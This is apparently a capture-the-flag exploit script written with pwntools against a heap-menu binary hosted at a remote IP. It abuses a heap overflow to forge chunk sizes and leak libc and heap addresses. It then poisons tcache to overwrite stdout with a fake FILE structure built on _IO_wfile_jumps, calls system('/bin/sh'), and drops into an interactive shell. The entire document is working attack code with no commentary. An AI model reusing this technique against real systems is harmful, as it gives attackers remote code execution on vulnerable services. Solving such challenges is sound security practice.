# solved by vietnq


#!/usr/bin/env python3

from pwn import *

exe = ELF("./code_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("14.225.198.235", 13335)

def choice(opt):
    p.sendlineafter(b'qnteiv@elysium> ', opt)
def add(idx, size, data):
    choice(b'upload')
    p.sendlineafter(b'(0-15): ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)
def show(idx):
    choice(b'view')
    p.sendlineafter(b'[INPUT] Memory slot (0-15): ', str(idx).encode())
def edit(idx, data):
    choice(b'edit')
    p.sendlineafter(b'(0-15): ', str(idx).encode())
    p.sendafter(b'[INPUT] New memory data: ', data)


payload = b'1'*8
add(0,0x508,payload)


payload = b'1'*0x508 + p64(0x861)
edit(0,payload)


add(1,0x400,b'1'*8)
add(2,0x500,b'1'*8)
add(3, 0x50+0x2a0, b'1'*8)
show(3)

p.recvuntil(b'[CONTENT]: ')
leak = p.recvuntil(b'\n')[:-2]
leak = leak.split(b' ')
x = leak[8:14]
vals = [int(b.decode(), 16) for b in x]

libc_leak = int.from_bytes(vals, byteorder='little')
libc_base = libc_leak - 0x21b0d0 
print("libc_leak : "+hex(libc_leak))
print("libc_base : "+hex(libc_base))

y = leak[16:22]
vals = [int(b.decode(), 16) for b in y]

heap_base = int.from_bytes(vals, byteorder='little') - 0xbb0
print("heap_base : "+hex(heap_base))

add(4, 0x120, b'1'*8)


add(5, 0x508, b'1'*8)
payload = b'1'*0x508 + p64(0x5e1)
edit(5,payload)


add(6, 0x5e0 - 0x130, b'1'*8)
add(7, 0x508,b'1'*8)
payload = b'1'*0x508 + p64(0xaf1)
edit(7,payload)


add(8, 0x500, b'1'*8)
add(9, 0x5e0 - 0x130 + 8, b'1'*8)
add(10, 0x500, b'1'*8)



stdout = libc_base + libc.sym['_IO_2_1_stdout_']
system = libc_base + libc.sym['system']
io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

target = (stdout ^ ((heap_base + 0x43ef0) >> 12))
payload = b'1'*(0x5e0 - 0x130 + 8) + p64(0x101)
payload += p64(target)
edit(9,payload)

fake_addr = heap_base + 0x43ef0

payload = b''
payload = payload.ljust(0x18,b'\0') + p64(0)
payload = payload.ljust(0x30,b'\0') + p64(0)
payload = payload.ljust(0x68, b'\0') + p64(system)
payload = payload.ljust(0xe0,b'\0') + p64(fake_addr)
add(11, 0x100 - 8, payload)


payload = b'  /bin/sh\0'
payload = payload.ljust(0x88,b'\0') + p64(heap_base + 0x1000)
payload = payload.ljust(0xa0, b'\0') + p64(fake_addr)
payload = payload.ljust(0xd8,b'\0') + p64(io_wfile_jumps-0x20)
add(12, 0x100 - 8, payload)



p.interactive()